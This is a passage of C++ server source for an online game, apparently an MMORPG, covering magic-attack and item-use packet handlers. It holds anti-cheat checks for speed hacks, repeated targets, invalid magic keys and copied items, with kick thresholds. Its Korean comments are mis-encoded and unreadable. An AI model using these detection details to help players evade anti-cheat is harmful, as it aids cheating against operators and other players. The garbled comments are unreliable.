			if( iTimeCalc < lpObj->m_DetectSpeedHackTime ) 
#else
	#ifdef FOR_THAILAND		
				if( iTimeCalc < lpObj->m_DetectSpeedHackTime ) 	
	#else
				if( iTimeCalc < lpObj->m_DetectSpeedHackTime && iTimeCalc != 0  ) 
	#endif
#endif
			{	
				lpObj->m_DetectCount++;
				lpObj->m_SumLastAttackTime += iTimeCalc;

				if( lpObj->m_DetectCount > gHackCheckCount )
				{
					lpObj->m_DetectedHackKickCount++;

					if( gIsKickDetecHackCountLimit ) 
					{
						if( lpObj->m_DetectedHackKickCount > gDetectedHackKickCount )
						{
#ifdef MODIFY_HACKLOG_OF_ATTACK_20050518
	#ifdef CHINA_HACKUSER_KICK_SYSTEM
							ChinaHackLogFile.Output("[%s][%s] %s Kick DetecHackCountLimit Over User (%d) @%d",
													 lpObj->AccountID, 
													 lpObj->Name, 
													 lMsg.Get(1900+lpObj->Class),
													 lpObj->m_DetectedHackKickCount,
													 lpObj->MapNumber);						     
	#else
							LogAddTD("[%s][%s] %s Kick DetecHackCountLimit Over User (%d) @%d",
									 lpObj->AccountID, 
									 lpObj->Name, 
									 lMsg.Get(1900+lpObj->Class),
									 lpObj->m_DetectedHackKickCount,
									 lpObj->MapNumber);						     
	#endif
#else
	#ifdef CHINA_HACKUSER_KICK_SYSTEM
							ChinaHackLogFile.Output("[%s][%s] %s Kick DetecHackCountLimit Over User (%d)",
													 lpObj->AccountID, 
													 lpObj->Name, 
													 lMsg.Get(1900+lpObj->Class),
													 lpObj->m_DetectedHackKickCount);						     
	#else
							LogAddTD("[%s][%s] %s Kick DetecHackCountLimit Over User (%d)",
									 lpObj->AccountID, 
									 lpObj->Name, 
									 lMsg.Get(1900+lpObj->Class),
									 lpObj->m_DetectedHackKickCount);						     
	#endif
#endif
							CloseClient(aIndex);
							return;
						}
					}
#ifdef MODIFY_HACKLOG_OF_ATTACK_20050518
	#ifdef CHINA_HACKUSER_KICK_SYSTEM
					ChinaHackLogFile.Output("[%s][%s] %s Attack Speed Is Wrong Magic3 (%d)(%d) Penalty %d @%d", 
											 lpObj->AccountID, 
											 lpObj->Name, 
											 lMsg.Get(1900+lpObj->Class),
											 lpObj->m_DetectSpeedHackTime,
											 lpObj->m_SumLastAttackTime/lpObj->m_DetectCount,
											 lpObj->m_SpeedHackPenalty,
											 lpObj->MapNumber);
					ChinaHackUserKick.InsertSpeedNCount(lpObj->m_Index);

	#else
					LogAddTD("[%s][%s] %s Attack Speed Is Wrong Magic3 (%d)(%d) Penalty %d", 
						 lpObj->AccountID, 
						 lpObj->Name, 
						 lMsg.Get(1900+lpObj->Class),
						 lpObj->m_DetectSpeedHackTime,
						 lpObj->m_SumLastAttackTime/lpObj->m_DetectCount,
						 lpObj->m_SpeedHackPenalty);				
	#endif
#else
	#ifdef CHINA_HACKUSER_KICK_SYSTEM
					ChinaHackLogFile.Output("[%s][%s] %s Attack Speed Is Wrong Magic3 (%d)(%d) Penalty %d @ %d", 
											 lpObj->AccountID, 
											 lpObj->Name, 
											 lMsg.Get(1900+lpObj->Class),
											 lpObj->m_DetectSpeedHackTime,
											 lpObj->m_SumLastAttackTime/lpObj->m_DetectCount,
											 lpObj->m_SpeedHackPenalty,
											 lpObj->MapNumber);
					ChinaHackUserKick.InsertSpeedNCount(lpObj->m_Index);

	#else
					LogAddTD("[%s][%s] %s Attack Speed Is Wrong Magic3 (%d)(%d) Penalty %d", 
						 lpObj->AccountID, 
						 lpObj->Name, 
						 lMsg.Get(1900+lpObj->Class),
						 lpObj->m_DetectSpeedHackTime,
						 lpObj->m_SumLastAttackTime/lpObj->m_DetectCount,
						 lpObj->m_SpeedHackPenalty);				
	#endif
#endif
					
					//if( bIsIgnorePacketSpeedHackDetect )
					//	return;
				}
				lpObj->m_LastAttackTime = GetTickCount();				
			}
			else
			{
				lpObj->m_SumLastAttackTime = 0;
				lpObj->m_DetectCount = 0;
			}
			lpObj->m_LastAttackTime = GetTickCount();

			//LogAdd("Multi Magic3 Attack Speed = [%d,%d] %d", gObj[aIndex].OSAttackSerial, lpObj->m_MagicSpeed, iTimeCalc);			
		}
	}	

#ifdef MODIFY_EVIL_BUGFIX_20080618	// �Ƿɻ�� ��ų Ŭ���� üũ
#ifdef UPDATE_MASTER_SKILL_4RANK_ADDITION_20080808	// ���˻� �Ƿ� ��ȭ �߰�
	if( lpMagic->m_Skill == AT_SKILL_EVIL || g_MasterSkillSystem.GetBaseMasterLevelSkill( lpMagic->m_Skill ) == AT_SKILL_ML_STRENGTHEN_EVIL
		|| g_MasterSkillSystem.GetBaseMasterLevelSkill( lpMagic->m_Skill ) == AT_SKILL_ML_STRENGTHEN_MAGUMSA_EVIL)
#else	// UPDATE_MASTER_SKILL_4RANK_ADDITION_20080808
#ifdef UPDATE_MASTER_LEVEL_4RANK_20080428
	if( lpMagic->m_Skill == AT_SKILL_EVIL || g_MasterSkillSystem.GetBaseMasterLevelSkill( lpMagic->m_Skill ) == AT_SKILL_ML_STRENGTHEN_EVIL )
#else	// UPDATE_MASTER_LEVEL_4RANK_20080428
	if( lpMagic->m_Skill == AT_SKILL_EVIL )
#endif	// UPDATE_MASTER_LEVEL_4RANK_20080428
#endif	// UPDATE_MASTER_SKILL_4RANK_ADDITION_20080808
	{
		if( gObj[aIndex].Class != CLASS_WIZARD && gObj[aIndex].Class != CLASS_MAGUMSA )
		{
			return;
		}
	}
#endif	// MODIFY_EVIL_BUGFIX_20080618

	if( bIsIgnorePacketSpeedHackDetect )
	{
		LPOBJECTSTRUCT lpObj= &gObj[aIndex];
		if( lpObj->m_SpeedHackPenalty > 0 )
		{
			lpObj->m_SpeedHackPenalty--;
#ifdef MODIFY_HACKLOG_OF_ATTACK_20050518
			LogAddTD("[%s][%s] %s Apply Attack Speed Penalty (%d left) @%d", 
					  lpObj->AccountID, lpObj->Name, lMsg.Get(1900+lpObj->Class),
					  lpObj->m_SpeedHackPenalty,
					  lpObj->MapNumber);
#else
			LogAddTD("[%s][%s] %s Apply Attack Speed Penalty (%d left)", 
					  lpObj->AccountID, lpObj->Name, lMsg.Get(1900+lpObj->Class),
					  lpObj->m_SpeedHackPenalty);
#endif
			return;
		}
	}

	
	int lOfs2 = lOfs;
	int pTargetNumber[128];

	for( int i = 0; i < lpCount->Count; i++ )
	{
		lpMsg = (LPPMSG_BEATTACK)(lpRecv+lOfs2);
		pTargetNumber[i] = MAKEWORD(lpMsg->NumberL, lpMsg->NumberH);
		lOfs2 += sizeof(PMSG_BEATTACK);
	}
	
	int n;
	for( n=0; n<lpCount->Count; n++)
	{
		lpMsg = (LPPMSG_BEATTACK)(lpRecv+lOfs);
		tNumber = MAKEWORD(lpMsg->NumberL, lpMsg->NumberH);

#ifdef APPLY_DURATION_MAGIC_HACK_CLEANER_20040504
		LPOBJECTSTRUCT lpObj= &gObj[aIndex];
		
		// MagicKey�� ������ 0���� �����ϸ� �Ʒ� �ڵ�� ��ȿȭ.
#ifdef MODIFY_EVIL_BUGFIX_20080618
#ifdef UPDATE_MASTER_SKILL_4RANK_ADDITION_20080808	// ���˻� �Ƿ� ��ȭ �߰�
		if( lpMsg->MagicKey == 0 && 
			( lpMagic->m_Skill == AT_SKILL_EVIL 
			|| g_MasterSkillSystem.GetBaseMasterLevelSkill( lpMagic->m_Skill ) == AT_SKILL_ML_STRENGTHEN_EVIL			// �Ƿ� ��ȭ
			|| g_MasterSkillSystem.GetBaseMasterLevelSkill( lpMagic->m_Skill ) == AT_SKILL_ML_STRENGTHEN_MAGUMSA_EVIL )	// ���˻� �Ƿ� ��ȭ
			)
#else	// UPDATE_MASTER_SKILL_4RANK_ADDITION_20080808
#ifdef UPDATE_MASTER_LEVEL_4RANK_20080428
		if( lpMsg->MagicKey == 0 && 
			( lpMagic->m_Skill == AT_SKILL_EVIL 
			|| g_MasterSkillSystem.GetBaseMasterLevelSkill( lpMagic->m_Skill ) == AT_SKILL_ML_STRENGTHEN_EVIL )	// �Ƿ� ��ȭ
			)
#else	// UPDATE_MASTER_LEVEL_4RANK_20080428
		if( lpMsg->MagicKey == 0 && lpMagic->m_Skill == AT_SKILL_EVIL )
#endif	// UPDATE_MASTER_LEVEL_4RANK_20080428
#endif	// UPDATE_MASTER_SKILL_4RANK_ADDITION_20080808
		{
			return;
		}
#endif	// MODIFY_EVIL_BUGFIX_20080618

#ifdef UPDATE_MASTER_LEVEL_4RANK_20080428	// ������ ���� 4��ũ �Ƿ� ��ȭ �߰�
		if( lpMsg->MagicKey != 0 &&   // MagicKey �� ���� �� �༮�鸸..
			(lpMagic->m_Skill == AT_SKILL_EVIL
			|| g_MasterSkillSystem.GetBaseMasterLevelSkill( lpMagic->m_Skill ) == AT_SKILL_ML_STRENGTHEN_EVIL	// �Ƿ� ��ȭ
#ifdef UPDATE_MASTER_SKILL_4RANK_ADDITION_20080808	// ���˻� �Ƿ� ��ȭ �߰�
			|| g_MasterSkillSystem.GetBaseMasterLevelSkill( lpMagic->m_Skill ) == AT_SKILL_ML_STRENGTHEN_MAGUMSA_EVIL // ���˻� �Ƿ� ��ȭ
#endif	// UPDATE_MASTER_SKILL_4RANK_ADDITION_20080808
			))
#else	// UPDATE_MASTER_LEVEL_4RANK_20080428
		if( lpMsg->MagicKey != 0 && lpMagic->m_Skill == AT_SKILL_EVIL ) // MagicKey �� ���� �� �༮�鸸..
#endif	// UPDATE_MASTER_LEVEL_4RANK_20080428
		{
			if( !lpObj->DurMagicKeyChecker.IsValidDurationTime( lpMsg->MagicKey ) ) 
			{
				LogAddC( 0, "�ڡڡڡ� InValid DurationTime Key = %d ( Time : %d) [%d][%d]", 
					lpMsg->MagicKey, lpObj->DurMagicKeyChecker.GetValidDurationTime(lpMsg->MagicKey), lpObj->AccountID, lpObj->Name);
				lOfs += sizeof(PMSG_BEATTACK);
				continue;
			}

			if( !lpObj->DurMagicKeyChecker.IsValidCount( lpMsg->MagicKey ) ) 
			{
				LogAddC( 0, "�ڡڡڡ� InValid VailidCount = %d ( Count : %d) [%d][%d]", 
					lpMsg->MagicKey, lpObj->DurMagicKeyChecker.GetValidCount(lpMsg->MagicKey), lpObj->AccountID, lpObj->Name );
				lOfs += sizeof(PMSG_BEATTACK);
				continue;
			}
			else
			{
				//LogAddC( 0, "�١١١� DecValidCount = [ %d ] [ %d ]", 
				//	lpMsg->MagicKey, lpObj->DurMagicKeyChecker.DecValidCount( lpMsg->MagicKey ) );
			}

			//LogAddC( 0, "�ڡ١ڡ� PASS");

#ifdef MODIFY_EVIL_BUGFIX_20080618	// �Ƿ� �Ÿ� üũ �߰�
			if( !CHECK_LIMIT( tNumber, MAX_OBJECT ) )
				continue;

			int dis = gObjCalDistance(lpObj, &gObj[tNumber]);
			if( dis > 13 )
			{
				lOfs += sizeof(PMSG_BEATTACK);
				continue;
			}
#endif	// MODIFY_EVIL_BUGFIX_20080618
		}
#endif		

#ifdef APPLY_TESTSERVER
		if( gWriteSkillLog )
			LogAddTD("Magic Attack3 : %d, serial = %d, Tgt =  %d, cnt = %d", lpMagic->m_Skill, lpCount->Serial, tNumber, lpCount->Count);
#endif

#ifdef CHECK_PENETRATION_SKILL
		if( gEnableCheckPenetrationSkill )
		{
#ifdef ADD_SKILL_DARKLOAD_FIRESCREAM_20060601	// ���̾ũ�� ��ų ��üũ
			if( lpMagic->m_Skill == AT_SKILL_FIRESCREAM )
			{
				if( !gMultiAttackHackCheck[gObj[aIndex].m_Index].CheckFireScreamSkill( tNumber, lpMagic->m_Skill, lpCount->Serial ) )
					return;
			}
			else
#endif	//ADD_SKILL_DARKLOAD_FIRESCREAM_20060601
			if( !gMultiAttackHackCheck[gObj[aIndex].m_Index].CheckPenetrationSkill(tNumber, lpMagic->m_Skill, lpCount->Serial) )
			{	// ���� ��ų�� �ѹ߿� �ϳ��� �������� ���� �Ѵ�
				//LogAddTD("[%s][%s] Ignore Skill [%d]", 
				//		 gObj[aIndex].AccountID, 
				//		 gObj[aIndex].Name, 
				//		 lpMagic->m_Skill);

				//GCServerMsgStringSend("Hack 2 Da", gObj[aIndex].m_Index, 1);
				//CloseClient(gObj[aIndex].m_Index);
				return;
			}		
		}
#endif


		for( int i = 0; i < lpCount->Count; i++ )
		{
			if( n != i )
			{
				if( pTargetNumber[i] == tNumber )
				{
					LogAddTD("[%s][%s] %s Detect Hack : Multi Attack", 
							 gObj[aIndex].AccountID, 
							 gObj[aIndex].Name, 
							 lMsg.Get(1900+gObj[aIndex].Class));
					CloseClient(gObj[aIndex].m_Index);
					return;
				}
			}
		}

		if( tNumber >= 0 && tNumber < MAX_OBJECT-1 )
		{
#ifdef NEW_FORSKYLAND2
			if( lpMagic->m_Skill == AT_SKILL_DEFENSEDOWN )
			{	// ���˻� ���� ����				
#ifdef MODIFY_BLOOD_ATTACK_AND_ADD_STRENGTH_BUGFIX_20080701
				if( gObj[aIndex].Type == OBJTYPE_CHARACTER )		// ��� ���� �� üũ
				{
					// ������ ��쿡�� ��� ������ ���� üũ �Ѵ�.
					if( gObj[aIndex].Strength+gObj[aIndex].AddStrength >= 596 )
					{
						gObjUseSkill.MaGumSkillDefenseDown(aIndex, tNumber, lpMagic->m_Level);
						gObjAttack(&gObj[aIndex], &gObj[tNumber], lpMagic, 1, 1);
					}
				}
				else	// ������ ��쿡�� ��� ������ ���� üũ���� �ʴ´�.
				{
					gObjUseSkill.MaGumSkillDefenseDown(aIndex, tNumber, lpMagic->m_Level);
					gObjAttack(&gObj[aIndex], &gObj[tNumber], lpMagic, 1, 1);
				}
#else
				gObjUseSkill.MaGumSkillDefenseDown(aIndex, tNumber, lpMagic->m_Level);
				gObjAttack(&gObj[aIndex], &gObj[tNumber], lpMagic, 1, 1);
#endif // MODIFY_BLOOD_ATTACK_AND_ADD_STRENGTH_BUGFIX_20080701
			}
			else
#endif
#ifdef ADD_SKILL_DARKLOAD_FIRESCREAM_20060601
			if( lpMagic->m_Skill == AT_SKILL_FIRESCREAM )
			{
				gObjUseSkill.SkillFireScream( aIndex, tNumber, lpMagic );
			}
			else
#endif
#ifdef ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107	
			// ���� ���� ��ȭ
			if( g_MasterSkillSystem.GetBaseMasterLevelSkill( lpMagic->m_Skill ) == AT_SKILL_ML_STRENGTHEN_DEFENSEDOWN )
			{
				g_MasterSkillSystem.MLS_MaGumSkillDefenseDown( aIndex, tNumber );
				gObjAttack(&gObj[aIndex], &gObj[tNumber], lpMagic, 1, 1);
			}
#ifdef MODIFY_MAGUMSA_SKILL_BUGFIX_20081015	// Attack �ߺ�ȣ�� ����
			else 
#endif	// MODIFY_MAGUMSA_SKILL_BUGFIX_20081015
			// ���̾� ��ũ�� ��ȭ
			if( g_MasterSkillSystem.GetBaseMasterLevelSkill( lpMagic->m_Skill ) == AT_SKILL_ML_STRENGTHEN_FIRESCREAM )
			{
				g_MasterSkillSystem.MLS_FireScream( aIndex, tNumber, lpMagic );
			}
			else
#endif	// ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107				
			{
				if( magic_send )
				{
					gObjAttack(&gObj[aIndex], &gObj[tNumber], lpMagic, 1, 1);
				}
				else gObjAttack(&gObj[aIndex], &gObj[tNumber], lpMagic, 0, 1);
			}
		}
		lOfs += sizeof(PMSG_BEATTACK);
	}	
}


// [0x1E] ���� ���� �߻�
void CGDurationMagicRecv(LPPMSG_DURATION_MAGIC_RECV lpMsg, int aIndex)
{
	CMagicInf *lpMagic;
		
	LPOBJECTSTRUCT lpObj= &gObj[aIndex];

	if( lpObj->Teleport ) return;	

	if( gObj[aIndex].Type == OBJTYPE_CHARACTER )
	{
#ifdef MODIFY_SAFEZONE_CHECK_ATTACK_20080903
		BYTE attr = MapC[gObj[aIndex].MapNumber].GetAttr(gObj[aIndex].X, gObj[aIndex].Y);
		
		if( ((attr&MAP_ATTR_SAFTYZONE) == MAP_ATTR_SAFTYZONE) )		// ���������� ������ �ȵǰ� �Ѵ�.
		{
			gObjSetPosition( aIndex, gObj[aIndex].X, gObj[aIndex].Y );
			
			return;
		}
#endif // MODIFY_SAFEZONE_CHECK_ATTACK_20080903

#ifdef ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107	// ��ų��ȣ BYTE -> WORD
		WORD wMagicNumber = MAKEWORD( lpMsg->MagicNumberL, lpMsg->MagicNumberH );
		lpMagic = gObjGetMagicSearch( lpObj, wMagicNumber );
#else
	#ifdef CHANGE_MAGICATTACKPACKET	// ���� ������ȣ ��ſ� ��ų ��ȣ�� ����
			lpMagic = gObjGetMagicSearch(lpObj, lpMsg->MagicNumber);
	#else
			lpMagic = gObjGetMagic(lpObj, lpMsg->MagicNumber);
	#endif
#endif	// ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107
	}
	else
	{
#ifdef ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107	// ��ų��ȣ BYTE -> WORD
		WORD wMagicNumber = MAKEWORD( lpMsg->MagicNumberL, lpMsg->MagicNumberH );
		lpMagic = gObjGetMagic( lpObj, wMagicNumber );
#else
		lpMagic = gObjGetMagic(lpObj, lpMsg->MagicNumber);
#endif
	}

	if( lpMagic == NULL )
	{		
		return;
	}

#ifdef ADD_NEW_SKILL_FOR_CASTLE_01_20041116
	if( lpObj->Type == OBJTYPE_CHARACTER )
	{
		// ��å�� ���� ������ ������ �ʴ´�. 
		if( MagicDamageC.CheckStatus( lpMagic->m_Skill, lpObj->GuildStatus ) == FALSE ) 
		{
			LogAddC( LOGC_RED, "[0x1E] CGDurationMagicRecv() - Invalid Status" );
			return;
		}
		
		// ųī��Ʈ üũ
		if( MagicDamageC.CheckKillCount( lpMagic->m_Skill, lpObj->m_btKillCount) < 0 )
		{
			LogAddC( LOGC_RED, "[0x1E] CGDurationMagicRecv() - Invalid KillCount" );
			return;
		}
	}
#endif

	lpObj->UseMagicNumber = 0;
#ifdef ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107	// �ٹ� ��ȭ ������ üũ ����
	if( lpMagic->m_Skill != AT_SKILL_CROSSBOW 
		&& lpMagic->m_Skill != AT_SKILL_ML_STRENGTHEN_CROSSBOW
		)
#else
	if( lpMagic->m_Skill != AT_SKILL_CROSSBOW )
#endif
	{	// ������ üũ
		if( !gObjUseSkill.SpeedHackCheck(aIndex) )
			return;	// ���ǵ� ���̴�
	}

	// ��밡���� ��ų���� üũ�Ѵ�
#ifdef ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107	// EnableSkill(...) �Ķ���� �߰�
	if( !gObjUseSkill.EnableSkill( lpMagic->m_Skill, lpMagic->m_Level ) )
		return;
#else
	if( !gObjUseSkill.EnableSkill(lpMagic->m_Skill) )
		return;
#endif
	
#ifdef EXPAND_ATTACK_PACKET_0X1E
	int aTargetIndex = MAKEWORD(lpMsg->NumberL, lpMsg->NumberH);	

	gObjUseSkill.UseSkill(aIndex, lpMagic, lpMsg->X, lpMsg->Y, lpMsg->Dir, lpMsg->TargetPos, aTargetIndex);
#else
	// ��ų�� ����Ѵ�
	#ifdef NEW_ATTACK_PROC
		gObjUseSkill.UseSkill(aIndex, lpMagic, lpMsg->X, lpMsg->Y, lpMsg->Dir, lpMsg->TargetPos);
	#else
		#ifdef ADD_SKILL_20031022			
			gObjUseSkill.UseSkill(aIndex, lpMagic, lpMsg->X, lpMsg->Y, lpMsg->Dir, lpMsg->TargetPos);
		#else
			gObjUseSkill.UseSkill(aIndex, lpMagic, lpMsg->X, lpMsg->Y, lpMsg->Dir);
		#endif
	#endif
#endif

#ifdef MODIFY_SKILL_EVEIL_AT_SERVER_20070117	// �Ƿ� ���� �Ǵ� - ����Ű�� ������� �ʴ´�.
	if( lpMagic->m_Skill == AT_SKILL_EVIL )
	{
		return;
	}
#endif
			
#ifdef APPLY_DURATION_MAGIC_HACK_CLEANER_20040504
	if( lpMsg->MagicKey != 0 )
	{
		lpObj->DurMagicKeyChecker.SetDurationTime( lpMsg->MagicKey, GetTickCount() );
	}
#endif

}

//////////////////////////////////////////////////////////////////////////////
// �ʿ� �����ϸ� �ڽ��� ��ġ�� ������ ����
void ObjectMapJoinPositionSend(short aIndex)
{
	PMSG_USERMAPJOIN	pObject;

	PHeadSubSetB((LPBYTE)&pObject, PMHC_MAPJOIN, 0x03, sizeof( pObject ) );	
	
	pObject.NumberH   = HIBYTE(aIndex);
	pObject.NumberL   = LOBYTE(aIndex);
	pObject.X		  = (BYTE)gObj[aIndex].X;
	pObject.Y		  = (BYTE)gObj[aIndex].Y;
	pObject.MapNumber = gObj[aIndex].MapNumber;
	pObject.Dir	      = gObj[aIndex].Dir;

	DataSend(aIndex, (LPBYTE)&pObject, pObject.h.size);
}


// ����ڰ� �������� ����Ѵٰ�..
// 0x26 
void CGUseItemRecv(LPPMSG_USEITEM lpMsg, int aIndex)
{
	int pos;
	CItem * citem;

#ifdef ADD_MINUS_STAT_SYSTEM_USING_FRUIT_20050712
	// ������ ��� ����� ���� Ÿ��
	int iItemUseType = lpMsg->btItemUseType;
#endif

	// ��ȯ���϶��� ������ ����� �� �� ����.
	if( gObj[aIndex].m_IfState.use ) 
	{
		if( gObj[aIndex].m_IfState.type != I_SHOP )
		{
#ifdef ADD_SHIELD_POINT_01_20060403
			GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1, (WORD)gObj[aIndex].iShield);
#else
			GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1);
#endif
			LogAdd("[%s][%s] CGUseItemRecv()_If return %s %d", gObj[aIndex].AccountID, gObj[aIndex].Name, __FILE__, __LINE__);
			return;
		}
	}
	// �������̸� �����ۿ� �մ�� ����
	if( gObj[aIndex].CloseType != -1 ) 
	{		
#ifdef ADD_SHIELD_POINT_01_20060403
		GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1, (WORD)gObj[aIndex].iShield);
#else
		GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1);
#endif
		LogAdd("[%s][%s] CGUseItemRecv()_CloseType return %s %d", gObj[aIndex].AccountID, gObj[aIndex].Name, __FILE__, __LINE__);
		return;
	}

#ifdef ITEM_DUPLICATE_PREVENT_PATCH_20040719			// ������ ���� ���� - �������� ����� ��
	if (gObjFixInventoryPointer(aIndex) == false) {
		LogAdd("[Fix Inv.Ptr] False Location - %s, %d", __FILE__, __LINE__);
	}
#endif

#ifdef ITEM_DUPLICATE_PREVENT_PATCH_BUGFIX_20040825		// Ʈ������� �ɷ��ִ� ���¿��� �������� ����� �� ����.
	if (gObj[aIndex].pTransaction == 1) {
		LogAddTD("[%s][%s] CGUseItemRecv() Failed : Transaction == 1, IF_TYPE : %d",
			gObj[aIndex].AccountID,
			gObj[aIndex].Name,
			gObj[aIndex].m_IfState.type
			);
		return;
	}
#endif

#ifdef ADD_NEWPVP_PKFIELD
	if ( g_NewPVP.IsObserver(gObj[aIndex]) )
	{
		// "�����߿��� ����� �� �����ϴ�."
		GCServerMsgStringSend(lMsg.Get(3428), aIndex, 1);
		return;
	}
#endif // ADD_NEWPVP_PKFIELD

	pos = lpMsg->inventoryPos;

	if( pos > MAX_INVENTORY-1 ) 
	{
		LogAdd(lMsg.Get(497), __FILE__, __LINE__);
#ifdef ADD_SHIELD_POINT_01_20060403
		GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1, (WORD)gObj[aIndex].iShield);
#else
		GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1);
#endif
		LogAdd("[%s][%s] CGUseItemRecv()_Inventory return %s %d", gObj[aIndex].AccountID, gObj[aIndex].Name, __FILE__, __LINE__);
		return;
	}
	
	// ��ġ�� ���ٸ� ���� ����
	if( lpMsg->inventoryPos == lpMsg->invenrotyTarget ) 
	{
#ifdef ADD_SHIELD_POINT_01_20060403
		GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1, (WORD)gObj[aIndex].iShield);
#else
		GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1);
#endif
		LogAdd("error-L1 : [%s][%s] CGUseItemRecv()_Pos return %s %d", gObj[aIndex].AccountID, gObj[aIndex].Name, __FILE__, __LINE__);
		return;
	}

	citem = (CItem*)&gObj[aIndex].pInventory[pos];

#ifdef HAPPY_POUCH // happycat@20050201 (���ָӴ�) - ���� �� �̺�Ʈ
	if (citem->m_Type == MAKE_ITEMNUM(14,11))
	{
		if (citem->m_Level == 14) //BLUE POUCH
		{
			gObj[aIndex].m_btLifeInc		= 50;
			gObj[aIndex].m_lLifeIncTime		= 600;	// 10 minutes
			
			if( gObj[aIndex].m_bPCBangUser == FALSE )	// apple��20050203 PC�濡�� �Ķ����� ����Ѱ��� �����Ѵ�.
			{
				gObj[aIndex].m_lFreeKalimaTime	= 600;	// 10 minutes, alicecat@
			}
			gObjCalCharacter(aIndex);

#ifndef ADD_SHIELD_POINT_01_20060403	// not define ���� : gObjCalCharacter���� �̹� ȣ�� �Ѵ�.
			GCReFillSend( aIndex, (WORD)(gObj[aIndex].MaxLife + gObj[aIndex].AddLife), 0xFE, 0 );
#endif


			//alicecat@
			PMSG_NOTICE	pNotice;						
			TNotice::MakeNoticeMsgEx( &pNotice, 1, "���� ���� 10�а� Į������ ����� ���� �Ͻ� �� �ֽ��ϴ�.");
			DataSend(aIndex, (LPBYTE)&pNotice, pNotice.h.size);
			
			GCInventoryItemDeleteSend(aIndex, pos, 1);
			gObjInventoryDeleteItem(aIndex, pos);

#ifdef UPDATE_ADD_LOG_20080117
			LogAddTD( "[UseItem] (%s)(%s) Used Box Luck Item ",	gObj[aIndex].AccountID, gObj[aIndex].Name );
			return;	// ������ �������� ������ �Ʒ��� ������ ���翩�ΰ˻�� ���������� ����
#endif
		}		
	}
#endif//HAPPY_POUCH	


	// �������� �����ϴ°�?
	if( citem->IsItem() )
	{

#ifdef ANTIHACKING_SERIAL_0_ITEM_20051202
		if( gObjCheckSerial0ItemList(citem) )
		{
			// MODIFY_LOCALIZING_WTF_20060309 ���ö���¡ wtf ���� ������Ʈ 0.99.60 - 0.99.94
			MsgOutput( aIndex, lMsg.Get(3354) );			// "����� �� �����ϴ�. �����Ϳ� �����ϼ���."
#ifdef ADD_SHIELD_POINT_01_20060403
			GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1, (WORD)gObj[aIndex].iShield);
#else
			GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1);
#endif
			LogAddTD( "[ANTI-HACK][Serial 0 Item] [UseItem] (%s)(%s) Item(%s) Pos(%d)",
				gObj[aIndex].AccountID, gObj[aIndex].Name, citem->GetName(), pos );
			return;
		}
#endif

		// ���� ������ �̸� ��뵵 �ȵǰ�..
		if( gObjInventorySearchSerialNumber(&gObj[aIndex], citem->GetNumber()) == FALSE )
		{
#ifdef ADD_SHIELD_POINT_01_20060403
			GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1, (WORD)gObj[aIndex].iShield);
#else
			GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1);
#endif
			LogAdd("error-L2 : CopyItem [%s][%s] return %s %d", gObj[aIndex].AccountID, gObj[aIndex].Name, __FILE__, __LINE__);
			return;
		}

		if( citem->m_serial )
		{	
			if( !gObjCanItemTouch(&gObj[aIndex], 1) )
			{	// ������ ���� �ø����� ������ �������� ������� ���Ѵ�
#ifdef ADD_SHIELD_POINT_01_20060403
				GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1, (WORD)gObj[aIndex].iShield);
#else
				GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1);
#endif
				return;
			}
		}

		// �������� ��ǰ�?
		if( citem->m_Type == MAKE_ITEMNUM(14,0) || 
			citem->m_Type == MAKE_ITEMNUM(14,1) ||
			citem->m_Type == MAKE_ITEMNUM(14,2) ||
			citem->m_Type == MAKE_ITEMNUM(14,3) )	// ���� ���� �����̸�..
		{
			int tLife = citem->m_Value*10-(gObj[aIndex].Level*2);
			if( tLife < 0 ) tLife = 0;

#ifdef ADD_HP_POTION_LEVEL1_20040401
			int nAddRate = 0;
			
			switch(citem->m_Type)
			{
			case MAKE_ITEMNUM2(14,0):
				nAddRate = g_GlobalConfig.m_iApple_Potion;
				break;
			case MAKE_ITEMNUM2(14,1):
				nAddRate = g_GlobalConfig.m_iSmallHP_Potion;
				break;
			case MAKE_ITEMNUM2(14,2):
				nAddRate = g_GlobalConfig.m_iMediumHP_Potion;
				break;
			case MAKE_ITEMNUM2(14,3):
				nAddRate = g_GlobalConfig.m_iLargeHP_Potion;
				break;
			}

			if( citem->m_Level == 1 )
				nAddRate += 5;

			tLife += (int)gObj[aIndex].MaxLife*nAddRate/100;
#else
			switch(citem->m_Type)
			{
			case MAKE_ITEMNUM2(14,0):
				tLife += (int)gObj[aIndex].MaxLife*g_GlobalConfig.m_iApple_Potion/100;
				break;
			case MAKE_ITEMNUM2(14,1):
				tLife += (int)gObj[aIndex].MaxLife*g_GlobalConfig.m_iSmallHP_Potion/100;
				break;
			case MAKE_ITEMNUM2(14,2):
				tLife += (int)gObj[aIndex].MaxLife*g_GlobalConfig.m_iMediumHP_Potion/100;
				break;
			case MAKE_ITEMNUM2(14,3):
				tLife += (int)gObj[aIndex].MaxLife*g_GlobalConfig.m_iLargeHP_Potion/100;
				break;
			}
#endif
			
#ifdef IMMEDIATELY_HP_MP_AG_RECUPERATION_20050614
			if( citem->m_Type == MAKE_ITEMNUM(14,0) ) {
				if( citem->m_Level < 2) {
					gObj[aIndex].FillLife += tLife;
					tLife = 0; // ������ HP�� ���� ���� ������ �ϱ� ����
				}
			}
#endif

